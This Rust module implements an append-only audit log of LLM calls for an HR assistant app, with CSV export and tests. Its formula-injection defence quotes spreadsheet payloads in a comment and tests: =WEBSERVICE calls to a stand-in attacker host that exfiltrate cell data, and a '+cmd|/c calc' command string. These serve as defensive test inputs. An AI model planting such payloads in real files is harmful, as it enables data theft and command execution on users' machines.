// People Partner - Audit Logging Module
// Records all LLM egress for compliance tracking
//
// Key responsibilities:
// 1. Record one row per LLM egress attempt (`record_llm_egress`), written
//    backend-side at the chat seam (#112) — interactive chat, memory
//    summaries, review highlights, title generation, recruiting intake —
//    including partial rows for errored/cancelled streams
// 2. List/filter audit entries for review
// 3. Export audit log to CSV format
//
// Design: the seam writes the row after the attempt resolves; audit
// failures are logged but never block the chat flow. The frontend has
// read-only access — there is no frontend write path to spoof.
//
// Retention position (#112): append-only, forever. Migration 011's triggers
// block UPDATE/DELETE at the DB layer and there is no deletion UI. Auditors
// export via CSV; purging the log means deleting the local database, which
// the user owns. A configurable retention window is a potential future
// enterprise feature — revisit before any enterprise push.

use serde::{Deserialize, Serialize};
use sqlx::FromRow;
use thiserror::Error;
use uuid::Uuid;

use crate::db::DbPool;

// ============================================================================
// Error Types
// ============================================================================

#[derive(Error, Debug)]
pub enum AuditError {
    #[error("Database error: {0}")]
    Database(String),
    #[error("Audit entry not found: {0}")]
    NotFound(String),
    #[error("Invalid input: {0}")]
    InvalidInput(String),
    #[error("Export error: {0}")]
    ExportError(String),
}

impl From<sqlx::Error> for AuditError {
    fn from(err: sqlx::Error) -> Self {
        AuditError::Database(err.to_string())
    }
}

// Make AuditError serializable for Tauri commands
impl serde::Serialize for AuditError {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        serializer.serialize_str(&self.to_string())
    }
}

// ============================================================================
// Types
// ============================================================================

/// Full audit log entry from database
#[derive(Debug, Clone, Serialize, Deserialize, FromRow)]
pub struct AuditEntry {
    pub id: String,
    pub conversation_id: Option<String>,
    pub request_redacted: String,
    pub response_text: String, // Stored as redacted metadata, not full model output
    pub context_used: Option<String>, // JSON array of employee IDs
    pub created_at: String,
    /// V2.4.2: Query category for filtering (e.g., "dei")
    pub query_category: Option<String>,
    /// #112: Where the egress originated (see `EgressSource`). NULL on rows
    /// written by the retired frontend path (pre-migration-015).
    pub source: Option<String>,
    /// #112: How the attempt ended: "ok" | "error" | "cancelled". NULL on
    /// pre-015 rows (all success-only by construction).
    pub status: Option<String>,
}

// ============================================================================
// Backend egress audit (#112)
// ============================================================================

/// Where an LLM egress originated. The `as_str` labels are the audit log's
/// public vocabulary (CSV export, filters) — treat them as append-only.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EgressSource {
    /// User-initiated chat (streaming or non-streaming command).
    Interactive,
    /// Cross-conversation memory summarization.
    MemorySummary,
    /// Performance-review highlight extraction.
    HighlightExtraction,
    /// Per-employee highlight summary generation.
    HighlightSummary,
    /// Conversation title generation.
    TitleGeneration,
    /// Recruiting intake LLM calls (company/profile analysis, seed
    /// extraction). These share the chat seam, so they audit here; the full
    /// recruiting choke point (incl. Exa egress) is FHR-91.
    RecruitingIntake,
}

impl EgressSource {
    pub fn as_str(&self) -> &'static str {
        match self {
            EgressSource::Interactive => "interactive",
            EgressSource::MemorySummary => "memory_summary",
            EgressSource::HighlightExtraction => "highlight_extraction",
            EgressSource::HighlightSummary => "highlight_summary",
            EgressSource::TitleGeneration => "title_generation",
            EgressSource::RecruitingIntake => "recruiting_intake",
        }
    }
}

/// How an egress attempt ended. Error/Cancelled rows are partial: the request
/// left the machine, the response did not complete. `partial_chars` records
/// how much of a response had streamed back before the interruption.
#[derive(Debug, Clone)]
pub enum EgressOutcome {
    Ok { response_chars: usize },
    Error { partial_chars: usize, error: String },
    Cancelled { partial_chars: usize },
}

/// Caller-supplied context for an egress audit row. Constructed at the call
/// site (which knows the conversation/employee context) and handed to the
/// chat seam, which writes the row itself — call sites can't forget to audit.
#[derive(Debug, Clone)]
pub struct EgressAudit {
    pub source: EgressSource,
    pub conversation_id: Option<String>,
    pub employee_ids: Vec<String>,
    pub query_category: Option<String>,
}

/// Bound on the error-class fragment embedded in an error row's metadata.
/// Provider error bodies echo request fragments and are unbounded; the audit
/// row keeps a prefix sufficient to classify the failure.
const EGRESS_ERROR_PREVIEW_CHARS: usize = 200;

/// Record one LLM egress attempt in the audit log.
///
/// The single backend write path for #112: called by the chat seam after
/// every attempt — success, provider/stream error, or user cancel. Failures
/// here must never block the chat flow; callers log-and-continue.
pub async fn record_llm_egress(
    pool: &DbPool,
    ctx: &EgressAudit,
    request_redacted: &str,
    outcome: &EgressOutcome,
) -> Result<(), AuditError> {
    let id = Uuid::new_v4().to_string();

    let (status, response_metadata) = match outcome {
        EgressOutcome::Ok { response_chars } => (
            "ok",
            format!("[REDACTED_RESPONSE length={response_chars} chars]"),
        ),
        EgressOutcome::Error { partial_chars, error } => (
            "error",
            format!(
                "[STREAM_ERROR after {partial_chars} chars: {}]",
                truncate_preview(error, EGRESS_ERROR_PREVIEW_CHARS)
            ),
        ),
        EgressOutcome::Cancelled { partial_chars } => (
            "cancelled",
            format!("[STREAM_CANCELLED after {partial_chars} chars]"),
        ),
    };

    let context_used = if ctx.employee_ids.is_empty() {
        None
    } else {
        Some(serde_json::to_string(&ctx.employee_ids).map_err(|e| {
            AuditError::InvalidInput(format!("Failed to serialize employee IDs: {}", e))
        })?)
    };

    sqlx::query(
        r#"
        INSERT INTO audit_log (id, conversation_id, request_redacted, response_text, context_used, query_category, source, status, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))
        "#,
    )
    .bind(&id)
    .bind(&ctx.conversation_id)
    .bind(request_redacted)
    .bind(&response_metadata)
    .bind(&context_used)
    .bind(&ctx.query_category)
    .bind(ctx.source.as_str())
    .bind(status)
    .execute(pool)
    .await?;

    Ok(())
}

/// Lightweight audit entry for list display
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditListItem {
    pub id: String,
    pub conversation_id: Option<String>,
    pub request_preview: String,  // First 100 chars
    pub response_preview: String, // First 100 chars
    pub employee_count: usize,
    pub created_at: String,
}

/// Filter options for listing/exporting audit entries
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct AuditFilter {
    pub conversation_id: Option<String>,
    pub start_date: Option<String>, // ISO 8601 format
    pub end_date: Option<String>,   // ISO 8601 format
    /// V2.4.2: Filter by query category (e.g., "dei")
    pub query_category: Option<String>,
}

/// CSV export result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExportResult {
    pub csv_content: String,
    pub row_count: usize,
}

// ============================================================================
// Core Functions
// ============================================================================

// #112: `create_audit_entry` (the frontend-facing write) was removed —
// `record_llm_egress` above is the single write path, called from the chat
// seam. The frontend keeps read-only access.

/// Get an audit entry by ID
pub async fn get_audit_entry(pool: &DbPool, id: &str) -> Result<AuditEntry, AuditError> {
    let entry = sqlx::query_as::<_, AuditEntry>(
        r#"
        SELECT id, conversation_id, request_redacted, response_text, context_used, created_at, query_category, source, status
        FROM audit_log
        WHERE id = ?
        "#,
    )
    .bind(id)
    .fetch_optional(pool)
    .await?;

    entry.ok_or_else(|| AuditError::NotFound(id.to_string()))
}

/// List audit entries with optional filtering
///
/// Returns lightweight items sorted by created_at (most recent first)
pub async fn list_audit_entries(
    pool: &DbPool,
    filter: Option<AuditFilter>,
    limit: Option<i64>,
    offset: Option<i64>,
) -> Result<Vec<AuditListItem>, AuditError> {
    let filter = filter.unwrap_or_default();
    let limit = limit.unwrap_or(50);
    let offset = offset.unwrap_or(0);

    // Build dynamic query with filters
    let mut conditions = vec!["1=1".to_string()];
    let mut bindings: Vec<String> = vec![];

    if let Some(conv_id) = &filter.conversation_id {
        conditions.push("conversation_id = ?".to_string());
        bindings.push(conv_id.clone());
    }

    if let Some(start) = &filter.start_date {
        conditions.push("created_at >= ?".to_string());
        bindings.push(start.clone());
    }

    if let Some(end) = &filter.end_date {
        conditions.push("created_at <= ?".to_string());
        bindings.push(end.clone());
    }

    // V2.4.2: Add query_category filter
    if let Some(category) = &filter.query_category {
        conditions.push("query_category = ?".to_string());
        bindings.push(category.clone());
    }

    let query = format!(
        r#"
        SELECT id, conversation_id, request_redacted, response_text, context_used, created_at, query_category, source, status
        FROM audit_log
        WHERE {}
        ORDER BY created_at DESC
        LIMIT ? OFFSET ?
        "#,
        conditions.join(" AND ")
    );

    // Build query with dynamic bindings
    let mut sqlx_query = sqlx::query_as::<_, AuditEntry>(&query);
    for binding in &bindings {
        sqlx_query = sqlx_query.bind(binding);
    }
    sqlx_query = sqlx_query.bind(limit).bind(offset);

    let entries = sqlx_query.fetch_all(pool).await?;

    // Transform to list items with previews
    let list_items = entries
        .into_iter()
        .map(|e| {
            let employee_count = e
                .context_used
                .as_ref()
                .and_then(|json| serde_json::from_str::<Vec<String>>(json).ok())
                .map(|ids| ids.len())
                .unwrap_or(0);

            AuditListItem {
                id: e.id,
                conversation_id: e.conversation_id,
                request_preview: truncate_preview(&e.request_redacted, 100),
                response_preview: truncate_preview(&e.response_text, 100),
                employee_count,
                created_at: e.created_at,
            }
        })
        .collect();

    Ok(list_items)
}

/// Count audit entries matching filter (for pagination)
pub async fn count_audit_entries(
    pool: &DbPool,
    filter: Option<AuditFilter>,
) -> Result<i64, AuditError> {
    let filter = filter.unwrap_or_default();

    // Build dynamic query with filters
    let mut conditions = vec!["1=1".to_string()];
    let mut bindings: Vec<String> = vec![];

    if let Some(conv_id) = &filter.conversation_id {
        conditions.push("conversation_id = ?".to_string());
        bindings.push(conv_id.clone());
    }

    if let Some(start) = &filter.start_date {
        conditions.push("created_at >= ?".to_string());
        bindings.push(start.clone());
    }

    if let Some(end) = &filter.end_date {
        conditions.push("created_at <= ?".to_string());
        bindings.push(end.clone());
    }

    // V2.4.2: Add query_category filter
    if let Some(category) = &filter.query_category {
        conditions.push("query_category = ?".to_string());
        bindings.push(category.clone());
    }

    let query = format!(
        "SELECT COUNT(*) FROM audit_log WHERE {}",
        conditions.join(" AND ")
    );

    let mut sqlx_query = sqlx::query_as::<_, (i64,)>(&query);
    for binding in &bindings {
        sqlx_query = sqlx_query.bind(binding);
    }

    let result = sqlx_query.fetch_one(pool).await?;
    Ok(result.0)
}

/// Export audit log to CSV format
///
/// Returns CSV content as a string for download.
/// Response is truncated to first 500 chars to keep file size reasonable.
pub async fn export_to_csv(
    pool: &DbPool,
    filter: Option<AuditFilter>,
) -> Result<ExportResult, AuditError> {
    let filter = filter.unwrap_or_default();

    // Build dynamic query with filters
    let mut conditions = vec!["1=1".to_string()];
    let mut bindings: Vec<String> = vec![];

    if let Some(conv_id) = &filter.conversation_id {
        conditions.push("conversation_id = ?".to_string());
        bindings.push(conv_id.clone());
    }

    if let Some(start) = &filter.start_date {
        conditions.push("created_at >= ?".to_string());
        bindings.push(start.clone());
    }

    if let Some(end) = &filter.end_date {
        conditions.push("created_at <= ?".to_string());
        bindings.push(end.clone());
    }

    // V2.4.2: Add query_category filter
    if let Some(category) = &filter.query_category {
        conditions.push("query_category = ?".to_string());
        bindings.push(category.clone());
    }

    let query = format!(
        r#"
        SELECT id, conversation_id, request_redacted, response_text, context_used, created_at, query_category, source, status
        FROM audit_log
        WHERE {}
        ORDER BY created_at DESC
        "#,
        conditions.join(" AND ")
    );

    let mut sqlx_query = sqlx::query_as::<_, AuditEntry>(&query);
    for binding in &bindings {
        sqlx_query = sqlx_query.bind(binding);
    }

    let entries = sqlx_query.fetch_all(pool).await?;
    let row_count = entries.len();

    // Build CSV content
    let mut csv = String::new();

    // Header row (V2.4.2: added query_category; #112: source + status)
    csv.push_str("id,timestamp,conversation_id,query_category,source,status,request_redacted,response_preview,employee_ids_used\n");

    // Data rows
    for entry in &entries {
        let employee_ids = entry
            .context_used
            .as_ref()
            .and_then(|json| serde_json::from_str::<Vec<String>>(json).ok())
            .map(|ids| ids.join(";"))
            .unwrap_or_default();

        csv.push_str(&format!(
            "{},{},{},{},{},{},{},{},{}\n",
            escape_csv(&entry.id),
            escape_csv(&entry.created_at),
            escape_csv(&entry.conversation_id.clone().unwrap_or_default()),
            escape_csv(&entry.query_category.clone().unwrap_or_default()),
            escape_csv(entry.source.as_deref().unwrap_or_default()),
            escape_csv(entry.status.as_deref().unwrap_or_default()),
            escape_csv(&entry.request_redacted),
            escape_csv(&truncate_preview(&entry.response_text, 500)),
            escape_csv(&employee_ids),
        ));
    }

    Ok(ExportResult { csv_content: csv, row_count })
}

// ============================================================================
// Helper Functions
// ============================================================================

/// Truncate text to a preview length, adding ellipsis if truncated
fn truncate_preview(text: &str, max_len: usize) -> String {
    let trimmed = text.trim();
    if trimmed.len() <= max_len {
        trimmed.to_string()
    } else {
        let end = trimmed
            .char_indices()
            .take_while(|(i, _)| *i < max_len.saturating_sub(3))
            .last()
            .map(|(i, c)| i + c.len_utf8())
            .unwrap_or(0);
        format!("{}...", &trimmed[..end])
    }
}

/// Escape a string for CSV format.
///
/// Handles two distinct concerns:
/// 1. CSV structural escaping — wrap in quotes if the field contains a
///    comma, double-quote, or newline; double any internal quotes.
/// 2. Excel/Numbers formula-injection defense — if the field begins with a
///    formula-trigger character (`=`, `+`, `-`, `@`, `\t`, `\r`), prefix
///    a single quote so the spreadsheet treats it as text. Without this,
///    a malicious chat content like `=WEBSERVICE("http://attacker/?data="&A1)`
///    would exfiltrate the audit log when opened in Excel.
fn escape_csv(s: &str) -> String {
    // Check for formula-trigger chars at the very start, before any escaping.
    // We do NOT trim — a leading space/tab preceding `=` is still risky.
    let prefixed: std::borrow::Cow<'_, str> = match s.chars().next() {
        Some('=') | Some('+') | Some('-') | Some('@') | Some('\t') | Some('\r') => {
            std::borrow::Cow::Owned(format!("'{s}"))
        }
        _ => std::borrow::Cow::Borrowed(s),
    };

    let needs_quoting = prefixed.contains(',')
        || prefixed.contains('"')
        || prefixed.contains('\n')
        || prefixed.contains('\r');

    if needs_quoting {
        format!("\"{}\"", prefixed.replace('"', "\"\""))
    } else {
        prefixed.into_owned()
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_truncate_preview_short() {
        let text = "Hello world";
        let result = truncate_preview(text, 100);
        assert_eq!(result, "Hello world");
    }

    #[test]
    fn test_truncate_preview_long() {
        let text = "This is a very long text that should be truncated";
        let result = truncate_preview(text, 20);
        assert_eq!(result, "This is a very lo...");
        assert!(result.len() <= 20);
    }

    #[test]
    fn test_truncate_preview_trims_whitespace() {
        let text = "  Hello world  ";
        let result = truncate_preview(text, 100);
        assert_eq!(result, "Hello world");
    }

    #[test]
    fn test_escape_csv_simple() {
        assert_eq!(escape_csv("hello"), "hello");
    }

    #[test]
    fn test_escape_csv_with_comma() {
        assert_eq!(escape_csv("hello, world"), "\"hello, world\"");
    }

    #[test]
    fn test_escape_csv_with_quotes() {
        assert_eq!(escape_csv("say \"hello\""), "\"say \"\"hello\"\"\"");
    }

    #[test]
    fn test_escape_csv_with_newline() {
        assert_eq!(escape_csv("line1\nline2"), "\"line1\nline2\"");
    }

    // ============================================================================
    // CSV formula-injection regression tests — protects audit-log export from
    // triggering Excel/Numbers formulas when the auditor opens the file.
    // ============================================================================

    #[test]
    fn escape_csv_neutralizes_equals_formula() {
        // `=WEBSERVICE(...)` would exfiltrate cell contents to attacker.tld
        // The single-quote prefix forces Excel to render the string literally.
        let attack = "=WEBSERVICE(\"http://attacker.tld\")";
        let out = escape_csv(attack);
        assert!(out.starts_with('"'), "should be quoted for the embedded quote");
        assert!(
            out.contains("'=WEBSERVICE"),
            "leading single quote missing: {out}"
        );
    }

    #[test]
    fn escape_csv_neutralizes_plus_minus_at_tab_cr() {
        // When the field has no other CSV-escape trigger, the prefixed output
        // is returned as-is. Use `starts_with` in that case.
        assert!(escape_csv("+cmd|/c calc").starts_with("'+"));
        assert!(escape_csv("-2+3").starts_with("'-"));
        assert!(escape_csv("\tSUM(1)").starts_with("'\t"));

        // When the field contains a comma, quote, newline, or \r it also gets
        // wrapped in quotes — the single-quote prefix is still present, just
        // inside the wrapping quotes.
        let at_with_comma = escape_csv("@SUM(1,2)");
        assert!(
            at_with_comma.contains("'@"),
            "formula prefix missing inside quoted field: {at_with_comma}"
        );
        let cr_attack = escape_csv("\rSUM(1)");
        assert!(cr_attack.contains("'\r"), "formula prefix missing: {cr_attack:?}");
    }

    #[test]
    fn escape_csv_preserves_legitimate_content() {
        // A legitimate negative number in a numeric field is rare in audit
        // logs (they're all text) but make sure normal strings are untouched.
        assert_eq!(escape_csv("Sarah Chen"), "Sarah Chen");
        assert_eq!(escape_csv("Marketing Manager"), "Marketing Manager");
    }

    #[test]
    fn test_audit_error_serialization() {
        let err = AuditError::NotFound("test-id".to_string());
        let serialized = serde_json::to_string(&err).unwrap();
        assert!(serialized.contains("Audit entry not found"));
    }

    #[test]
    fn test_audit_filter_default() {
        let filter = AuditFilter::default();
        assert!(filter.conversation_id.is_none());
        assert!(filter.start_date.is_none());
        assert!(filter.end_date.is_none());
        assert!(filter.query_category.is_none());
    }

    #[test]
    fn test_employee_ids_json_serialization() {
        let ids = vec!["emp-1".to_string(), "emp-2".to_string(), "emp-3".to_string()];
        let json = serde_json::to_string(&ids).unwrap();
        assert_eq!(json, r#"["emp-1","emp-2","emp-3"]"#);

        // Verify deserialization
        let parsed: Vec<String> = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.len(), 3);
        assert_eq!(parsed[0], "emp-1");
    }

    // ========================================================================
    // Append-only trigger tests (issue #21).
    // Verify migration 011's triggers block mutation at the DB layer and that
    // the FK change (ON DELETE SET NULL) preserves audit rows when their
    // parent conversation is deleted.
    // ========================================================================

    use sqlx::sqlite::{SqliteConnectOptions, SqlitePoolOptions};
    use std::time::Duration;

    async fn test_pool_with_migrations() -> crate::db::DbPool {
        let options = SqliteConnectOptions::new()
            .filename(":memory:")
            .create_if_missing(true)
            .foreign_keys(true)
            .busy_timeout(Duration::from_secs(5));
        let pool = SqlitePoolOptions::new()
            .max_connections(1)
            .connect_with(options)
            .await
            .expect("connect :memory: pool");
        crate::db::run_migrations_for_tests(&pool)
            .await
            .expect("run migrations");
        pool
    }

    async fn insert_audit_row(pool: &crate::db::DbPool, id: &str, conversation_id: Option<&str>) {
        sqlx::query(
            "INSERT INTO audit_log (id, conversation_id, request_redacted, response_text, created_at)
             VALUES (?, ?, 'redacted', 'resp', datetime('now'))",
        )
        .bind(id)
        .bind(conversation_id)
        .execute(pool)
        .await
        .expect("insert audit row");
    }

    // ========================================================================
    // record_llm_egress (issue #112): the single backend write path for LLM
    // egress audit rows. Every chat-seam call records one row per attempt —
    // success, error, or user cancel — so the audit log matches what actually
    // left the machine, not just what streamed back successfully.
    // ========================================================================

    #[tokio::test]
    async fn record_llm_egress_ok_writes_full_row() {
        let pool = test_pool_with_migrations().await;
        let ctx = EgressAudit {
            source: EgressSource::MemorySummary,
            conversation_id: Some("conv-1".into()),
            employee_ids: vec!["emp-1".into(), "emp-2".into()],
            query_category: None,
        };

        record_llm_egress(
            &pool,
            &ctx,
            "User: what is Sarah's rating?",
            &EgressOutcome::Ok { response_chars: 42 },
        )
        .await
        .expect("egress row must write");

        let entry: AuditEntry = sqlx::query_as(
            "SELECT id, conversation_id, request_redacted, response_text, context_used, created_at, query_category, source, status FROM audit_log",
        )
        .fetch_one(&pool)
        .await
        .unwrap();
        assert_eq!(entry.source.as_deref(), Some("memory_summary"));
        assert_eq!(entry.status.as_deref(), Some("ok"));
        assert_eq!(entry.conversation_id.as_deref(), Some("conv-1"));
        assert_eq!(entry.request_redacted, "User: what is Sarah's rating?");
        assert_eq!(entry.response_text, "[REDACTED_RESPONSE length=42 chars]");
        assert_eq!(
            entry.context_used.as_deref(),
            Some(r#"["emp-1","emp-2"]"#),
            "employee ids must serialize into context_used"
        );
    }

    #[tokio::test]
    async fn record_llm_egress_error_writes_partial_row() {
        let pool = test_pool_with_migrations().await;
        let ctx = EgressAudit {
            source: EgressSource::Interactive,
            conversation_id: None,
            employee_ids: vec![],
            query_category: None,
        };

        record_llm_egress(
            &pool,
            &ctx,
            "redacted question",
            &EgressOutcome::Error {
                partial_chars: 17,
                error: "HTTP 429: rate limited".into(),
            },
        )
        .await
        .expect("partial row must write");

        let (source, status, response): (Option<String>, Option<String>, String) = sqlx::query_as(
            "SELECT source, status, response_text FROM audit_log",
        )
        .fetch_one(&pool)
        .await
        .unwrap();
        assert_eq!(source.as_deref(), Some("interactive"));
        assert_eq!(status.as_deref(), Some("error"));
        assert!(
            response.contains("[STREAM_ERROR after 17 chars"),
            "error row must record how much streamed before failure: {response}"
        );
        assert!(
            response.contains("HTTP 429"),
            "error row must carry the error class: {response}"
        );
    }

    #[tokio::test]
    async fn record_llm_egress_cancelled_writes_partial_row() {
        let pool = test_pool_with_migrations().await;
        let ctx = EgressAudit {
            source: EgressSource::Interactive,
            conversation_id: Some("conv-9".into()),
            employee_ids: vec![],
            query_category: None,
        };

        record_llm_egress(
            &pool,
            &ctx,
            "redacted question",
            &EgressOutcome::Cancelled { partial_chars: 250 },
        )
        .await
        .expect("cancelled row must write");

        let (status, response): (Option<String>, String) =
            sqlx::query_as("SELECT status, response_text FROM audit_log")
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(status.as_deref(), Some("cancelled"));
        assert_eq!(response, "[STREAM_CANCELLED after 250 chars]");
    }

    #[tokio::test]
    async fn record_llm_egress_truncates_oversized_error_messages() {
        // Provider error bodies are attacker-adjacent (they echo request
        // fragments) and unbounded; the audit row keeps a bounded prefix.
        let pool = test_pool_with_migrations().await;
        let ctx = EgressAudit {
            source: EgressSource::HighlightExtraction,
            conversation_id: None,
            employee_ids: vec![],
            query_category: None,
        };

        let huge_error = "x".repeat(2000);
        record_llm_egress(
            &pool,
            &ctx,
            "req",
            &EgressOutcome::Error { partial_chars: 0, error: huge_error },
        )
        .await
        .unwrap();

        let (response,): (String,) = sqlx::query_as("SELECT response_text FROM audit_log")
            .fetch_one(&pool)
            .await
            .unwrap();
        assert!(
            response.chars().count() < 500,
            "error metadata must stay bounded, got {} chars",
            response.chars().count()
        );
    }

    #[test]
    fn egress_source_labels_are_stable() {
        // These strings are the audit log's public vocabulary — CSV exports
        // and future UI filters key on them. Renaming one silently forks the
        // history, so pin them.
        assert_eq!(EgressSource::Interactive.as_str(), "interactive");
        assert_eq!(EgressSource::MemorySummary.as_str(), "memory_summary");
        assert_eq!(EgressSource::HighlightExtraction.as_str(), "highlight_extraction");
        assert_eq!(EgressSource::HighlightSummary.as_str(), "highlight_summary");
        assert_eq!(EgressSource::TitleGeneration.as_str(), "title_generation");
        assert_eq!(EgressSource::RecruitingIntake.as_str(), "recruiting_intake");
    }

    // ========================================================================
    // Migration 015: additive source + status columns (issue #112).
    // Backend egress audit rows record where the call originated
    // (interactive / memory_summary / …) and how it ended (ok / error /
    // cancelled). Columns are nullable so pre-015 rows stay valid.
    // ========================================================================

    #[tokio::test]
    async fn migration_015_adds_source_and_status_columns() {
        let pool = test_pool_with_migrations().await;
        sqlx::query(
            "INSERT INTO audit_log (id, conversation_id, request_redacted, response_text, source, status, created_at)
             VALUES ('a1', NULL, 'redacted', '[REDACTED_RESPONSE length=5 chars]', 'memory_summary', 'ok', datetime('now'))",
        )
        .execute(&pool)
        .await
        .expect("insert with source/status must work after migration 015");

        let (source, status): (Option<String>, Option<String>) =
            sqlx::query_as("SELECT source, status FROM audit_log WHERE id = 'a1'")
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(source.as_deref(), Some("memory_summary"));
        assert_eq!(status.as_deref(), Some("ok"));
    }

    #[tokio::test]
    async fn migration_015_keeps_append_only_triggers_intact() {
        let pool = test_pool_with_migrations().await;
        insert_audit_row(&pool, "a1", None).await;

        let err = sqlx::query("UPDATE audit_log SET status = 'tampered' WHERE id = 'a1'")
            .execute(&pool)
            .await
            .expect_err("UPDATE of new column must still be blocked");
        assert!(
            err.to_string().contains("append-only"),
            "expected append-only abort, got: {err}"
        );
    }

    #[tokio::test]
    async fn audit_log_insert_still_works() {
        let pool = test_pool_with_migrations().await;
        insert_audit_row(&pool, "a1", None).await;
        let (count,): (i64,) = sqlx::query_as("SELECT COUNT(*) FROM audit_log")
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(count, 1);
    }

    #[tokio::test]
    async fn audit_log_update_is_blocked() {
        let pool = test_pool_with_migrations().await;
        insert_audit_row(&pool, "a1", None).await;

        let err = sqlx::query("UPDATE audit_log SET request_redacted = 'tampered' WHERE id = 'a1'")
            .execute(&pool)
            .await
            .expect_err("UPDATE must fail");
        assert!(
            err.to_string().contains("append-only"),
            "expected append-only abort, got: {err}"
        );
    }

    #[tokio::test]
    async fn audit_log_delete_is_blocked() {
        let pool = test_pool_with_migrations().await;
        insert_audit_row(&pool, "a1", None).await;

        let err = sqlx::query("DELETE FROM audit_log WHERE id = 'a1'")
            .execute(&pool)
            .await
            .expect_err("DELETE must fail");
        assert!(
            err.to_string().contains("append-only"),
            "expected append-only abort, got: {err}"
        );
    }

    #[tokio::test]
    async fn deleting_conversation_preserves_audit_row_with_dangling_ref() {
        let pool = test_pool_with_migrations().await;

        // Insert a conversation, then an audit row that references it.
        sqlx::query("INSERT INTO conversations (id, title) VALUES ('c1', 'test')")
            .execute(&pool)
            .await
            .unwrap();
        insert_audit_row(&pool, "a1", Some("c1")).await;

        // Delete the conversation — must succeed (no FK blocks it now) and
        // must leave the audit row behind unchanged. The conversation_id
        // becomes a dangling reference, which is acceptable because no code
        // JOINs audit_log back to conversations.
        sqlx::query("DELETE FROM conversations WHERE id = 'c1'")
            .execute(&pool)
            .await
            .expect("conversation delete must succeed");

        let (audit_count,): (i64,) =
            sqlx::query_as("SELECT COUNT(*) FROM audit_log WHERE id = 'a1'")
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(audit_count, 1, "audit row must survive conversation deletion");

        let (conv_id,): (Option<String>,) =
            sqlx::query_as("SELECT conversation_id FROM audit_log WHERE id = 'a1'")
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(
            conv_id.as_deref(),
            Some("c1"),
            "conversation_id must remain as-is (dangling reference), was: {:?}",
            conv_id
        );
    }

    #[tokio::test]
    async fn audit_log_has_no_fk_to_conversations() {
        // Migration 011 dropped the FK. Verify by inspecting foreign_key_list.
        // If this regresses (someone re-adds the FK), conversation deletion
        // will break at runtime because the SET NULL / NO ACTION interplay
        // with the append-only trigger is what motivated dropping the FK.
        let pool = test_pool_with_migrations().await;
        let fks: Vec<(String,)> = sqlx::query_as(
            "SELECT \"table\" FROM pragma_foreign_key_list('audit_log')",
        )
        .fetch_all(&pool)
        .await
        .unwrap();
        assert!(fks.is_empty(), "audit_log must have no FKs after migration 011, got: {:?}", fks);
    }
}
